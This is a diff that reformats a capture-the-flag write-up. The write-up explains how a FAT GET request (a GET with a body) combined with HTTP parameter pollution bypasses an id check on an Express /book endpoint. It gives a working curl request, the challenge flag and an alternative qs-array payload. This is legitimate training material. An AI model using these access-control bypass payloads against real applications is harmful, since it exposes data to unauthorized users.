@@ -36,7 +36,9 @@ By abusing FAT GET (sending a request body with a GET request) together with HPP
 
 The application exposes an endpoint similar to:
 
+```
 GET /book?id=2
+```
 
 Behavior observed:
 
@@ -56,11 +58,12 @@ Parameters sent in the body are parsed normally
 
 Example:
 
+```http
 GET /book?id=2 HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 
-
 id=1
+```
 
 This is known as a FAT GET.
 
@@ -94,23 +97,28 @@ By combining FAT GET + HPP, we fully bypass the restriction.
 
 Final exploit request:
 
-curl -X GET http://ctf.nexus-security.club:3555/book?id=2 \
+```bash
+curl -X GET "http://ctf.nexus-security.club:3555/book?id=2" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   -d "id=1"
+```
 5. Flag Retrieval
 
 The server responds with Book #1, which contains the flag:
 
-Flag: nexus{f4t_g3t++http_p4r4m3t3r_p0lut10n}
+**Flag:** `nexus{f4t_g3t++http_p4r4m3t3r_p0lut10n}`
 
 ## some unintended solution : 
 
-- Check author note that challenge doesn't require brute forcing => what you see (endpoints) is what you should attack
+- Check the author note: the challenge doesn't require brute forcing => what you see (endpoints) is what you should attack
 - Send a request to / and check X-Powered-By header => you know it's express
 - Send a request to /book?id=2 => book arrives, use id=1 and book doesn't => you know you need to   access book with id 1
 - Since you're dealing with express and query strings, you look up how query strings are handled there => find qs and think of how to bypass the assumed condition
 
 Working payload
-`/book?id[0]=2&id[1][]=1`
 
-the unintended solution from : hxuu , didicas didicas
+```
+/book?id[0]=2&id[1][]=1
+```
+
+the unintended solution is from : hxuu , didicas
